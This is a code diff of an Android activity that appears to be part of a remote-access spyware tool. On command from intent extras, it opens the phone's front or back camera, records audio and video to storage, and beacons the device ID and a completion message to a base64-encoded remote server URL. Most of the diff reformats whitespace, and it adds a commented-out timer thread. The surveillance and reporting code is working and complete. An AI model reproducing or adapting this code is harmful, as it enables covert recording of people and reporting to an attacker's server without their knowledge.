@@ -35,31 +35,31 @@ public class VideoView extends Activity implements /*OnClickListener,*/ SurfaceH
     MediaRecorder recorder;
     SurfaceHolder holder = null;
     boolean recording = false;
-    
-	private String URL;
-	private String password;
+
+    private String URL;
+    private String password;
     @Override
     public void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        
- 		try {
- 			URL = new String( Base64.decode( PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("URL", ""), Base64.DEFAULT ));
- 			password = new String( Base64.decode( PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("password", ""), Base64.DEFAULT ));
-		} catch (Exception e1) {e1.printStackTrace();}
- 		
+
+        try {
+            URL = new String( Base64.decode( PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("URL", ""), Base64.DEFAULT ));
+            password = new String( Base64.decode( PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("password", ""), Base64.DEFAULT ));
+        } catch (Exception e1) {e1.printStackTrace();}
+
         requestWindowFeature(Window.FEATURE_NO_TITLE);
         getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                 WindowManager.LayoutParams.FLAG_FULLSCREEN);
-        
+
 
         recorder = new MediaRecorder();
         try {
-			initRecorder();
-		} catch (UnknownHostException e) {
-			e.printStackTrace();
-		} catch (IOException e) {
-			e.printStackTrace();
-		}
+            initRecorder();
+        } catch (UnknownHostException e) {
+            e.printStackTrace();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
         setContentView(R.layout.videoview);
 
         SurfaceView cameraView = (SurfaceView) findViewById(R.id.surface_camera);
@@ -71,66 +71,66 @@ public class VideoView extends Activity implements /*OnClickListener,*/ SurfaceH
     private void initRecorder() throws UnknownHostException, IOException {
         SimpleDateFormat sdf = new SimpleDateFormat("yyyy_MM_dd_HH_mm");
         String currentDateandTime = sdf.format(new Date());
-        
+
         String filename = currentDateandTime + ".mp4";
         File diretory = new File(PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("File", "") + File.separator + "Videos");
         diretory.mkdirs();
-     	File outputFile = new File(diretory, filename);
-		
+        File outputFile = new File(diretory, filename);
+
         Intent sender=getIntent();
         String cameraNumber = sender.getExtras().getString("Camera");
         String time = sender.getExtras().getString("Time");
         Camera camera = Camera.open(Integer.parseInt(cameraNumber));
-	                    
-            int cameraCount = 0; 
-            Camera.CameraInfo cameraInfo = new Camera.CameraInfo(); 
-            cameraCount = Camera.getNumberOfCameras();
-            for ( int camIdx = 0; camIdx < cameraCount; camIdx++ ) { 
-                Camera.getCameraInfo( camIdx, cameraInfo ); 
-                if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_BACK && cameraNumber.equalsIgnoreCase("0")) { 
-                    try { 
-                    	Log.i("com.connect", "Back" + camIdx);
-                        camera = Camera.open( camIdx ); 
-                    } catch (RuntimeException e) { 
-                    } 
-                }                    
-                if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT && cameraNumber.equalsIgnoreCase("1")) { 
-                    try {
-                    	Log.i("com.connect", "Front" + camIdx);
-                        camera = Camera.open( camIdx ); 
-                    } catch (RuntimeException e) { 
-                    } 
+
+        int cameraCount = 0;
+        Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
+        cameraCount = Camera.getNumberOfCameras();
+        for ( int camIdx = 0; camIdx < cameraCount; camIdx++ ) {
+            Camera.getCameraInfo( camIdx, cameraInfo );
+            if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_BACK && cameraNumber.equalsIgnoreCase("0")) {
+                try {
+                    Log.i("com.connect", "Back" + camIdx);
+                    camera = Camera.open( camIdx );
+                } catch (RuntimeException e) {
                 }
-            } 
-            
+            }
+            if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT && cameraNumber.equalsIgnoreCase("1")) {
+                try {
+                    Log.i("com.connect", "Front" + camIdx);
+                    camera = Camera.open( camIdx );
+                } catch (RuntimeException e) {
+                }
+            }
+        }
+
         CamcorderProfile cpHigh = null;
         if(Integer.parseInt(cameraNumber) == 0)
         {
-        	cpHigh = CamcorderProfile.get(CamcorderProfile.QUALITY_HIGH); //if camera = 0
+            cpHigh = CamcorderProfile.get(CamcorderProfile.QUALITY_HIGH); //if camera = 0
         }
-		camera.unlock();
-		
-		recorder.setOrientationHint(270);
+        camera.unlock();
 
-		recorder.setCamera(camera);		
-	    recorder.setAudioSource(MediaRecorder.AudioSource.DEFAULT);
-	    recorder.setVideoSource(MediaRecorder.VideoSource.DEFAULT);
+        recorder.setOrientationHint(270);
 
-     	if(Integer.parseInt(cameraNumber)==0)
-     	{
-    	    recorder.setProfile(cpHigh);
-     	}
-     	
-    	Log.i("com.connect", "Profiled");
-     	if(Integer.parseInt(cameraNumber)==1)
-     	{
-         	recorder.setProfile(CamcorderProfile.get(CamcorderProfile.QUALITY_LOW));
-         	recorder.setVideoFrameRate(7);     	
+        recorder.setCamera(camera);
+        recorder.setAudioSource(MediaRecorder.AudioSource.DEFAULT);
+        recorder.setVideoSource(MediaRecorder.VideoSource.DEFAULT);
+
+        if(Integer.parseInt(cameraNumber)==0)
+        {
+            recorder.setProfile(cpHigh);
         }
-     	
-	    recorder.setOutputFile(outputFile.toString());
-	        
-        recorder.setMaxDuration(Integer.parseInt(time)); 
+
+        Log.i("com.connect", "Profiled");
+        if(Integer.parseInt(cameraNumber)==1)
+        {
+            recorder.setProfile(CamcorderProfile.get(CamcorderProfile.QUALITY_LOW));
+            recorder.setVideoFrameRate(7);
+        }
+
+        recorder.setOutputFile(outputFile.toString());
+
+        recorder.setMaxDuration(Integer.parseInt(time));
         recorder.setMaxFileSize(100000000); //100 mb
     }
 
@@ -140,7 +140,30 @@ public class VideoView extends Activity implements /*OnClickListener,*/ SurfaceH
         try {
             recorder.prepare();
             recorder.start();
-
+//            new Thread(){
+//                @Override
+//                public void run() {
+//                    try {
+//                        Thread.sleep(Integer.parseInt(getIntent().getExtras().getString("Time")));
+//                        if (recording) {
+//                            recorder.stop();
+//                            recording = false;
+//                        }
+//                        recorder.release();
+//                        PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Media",false).commit();
+//                        try {
+//                            getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Record Video Complete");
+//                        } catch (UnsupportedEncodingException e) {
+//
+//                            e.printStackTrace();
+//                        }
+//                        finish();
+//                    }catch (Exception e){
+//                        e.printStackTrace();
+//                    }
+//                    return;
+//                }
+//            }.start();
 
         } catch (IllegalStateException e) {
             e.printStackTrace();
@@ -156,7 +179,7 @@ public class VideoView extends Activity implements /*OnClickListener,*/ SurfaceH
     }
 
     public void surfaceChanged(SurfaceHolder holder, int format, int width,
-            int height) {
+                               int height) {
     }
 
     public void surfaceDestroyed(SurfaceHolder holder) {
@@ -165,59 +188,59 @@ public class VideoView extends Activity implements /*OnClickListener,*/ SurfaceH
             recording = false;
         }
         recorder.release();
-    	PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Media",false).commit();
-    	try {
-			getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Record Video Complete");
-		} catch (UnsupportedEncodingException e) {
-			 
-			e.printStackTrace();
-		}
+        PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).edit().putBoolean("Media",false).commit();
+        try {
+            getInputStreamFromUrl(URL + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(getApplicationContext()).getString("AndroidID", "") + "&Data=", "Record Video Complete");
+        } catch (UnsupportedEncodingException e) {
+
+            e.printStackTrace();
+        }
         finish();
-        
+
     }
-    
+
     public InputStream getInputStreamFromUrl(String urlBase, String urlData) throws UnsupportedEncodingException {
-    	
+
 //    	Log.d("com.connect", urlBase);
 //    	Log.d("com.connect", urlData);
 
-    	String urlDataFormatted=urlData;
-    	
+        String urlDataFormatted=urlData;
+
         SimpleDateFormat sdf = new SimpleDateFormat("yyyy_MM_dd_HH:mm:ss");
         String currentDateandTime = "[" + sdf.format(new Date()) + "] - ";
         currentDateandTime = URLEncoder.encode (currentDateandTime, "UTF-8");
 
         if(urlData.length()>1)
         {
-        Log.d("com.connect", urlBase + urlData);
+            Log.d("com.connect", urlBase + urlData);
 
-    	urlData = currentDateandTime + URLEncoder.encode (urlData, "UTF-8");
-    	urlDataFormatted = urlData.replaceAll("\\.", "~period");
-    	
-    	Log.d("com.connect", urlBase + urlDataFormatted);
+            urlData = currentDateandTime + URLEncoder.encode (urlData, "UTF-8");
+            urlDataFormatted = urlData.replaceAll("\\.", "~period");
+
+            Log.d("com.connect", urlBase + urlDataFormatted);
         }
 
-    	  InputStream content = null;
-      	if(isNetworkAvailable())
-      	{
-      	  try 
-      	  {
-      	    Log.i("com.connect", "network push POST");
-      	    HttpClient httpclient = new DefaultHttpClient();
-      	    HttpResponse response = httpclient.execute(new HttpGet(urlBase + urlDataFormatted));
-      	    content = response.getEntity().getContent();
-      	    httpclient.getConnectionManager().shutdown();
-      	  } catch (Exception e) {
-      		  Log.e("com.connect", "exception", e);
-      	  }
-      	    return content;
-      	}
-  		return null;
+        InputStream content = null;
+        if(isNetworkAvailable())
+        {
+            try
+            {
+                Log.i("com.connect", "network push POST");
+                HttpClient httpclient = new DefaultHttpClient();
+                HttpResponse response = httpclient.execute(new HttpGet(urlBase + urlDataFormatted));
+                content = response.getEntity().getContent();
+                httpclient.getConnectionManager().shutdown();
+            } catch (Exception e) {
+                Log.e("com.connect", "exception", e);
+            }
+            return content;
+        }
+        return null;
     }
-    
+
     public boolean isNetworkAvailable() {
-    	StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
-    	StrictMode.setThreadPolicy(policy);
-    	return true;
+        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
+        StrictMode.setThreadPolicy(policy);
+        return true;
     }
 }
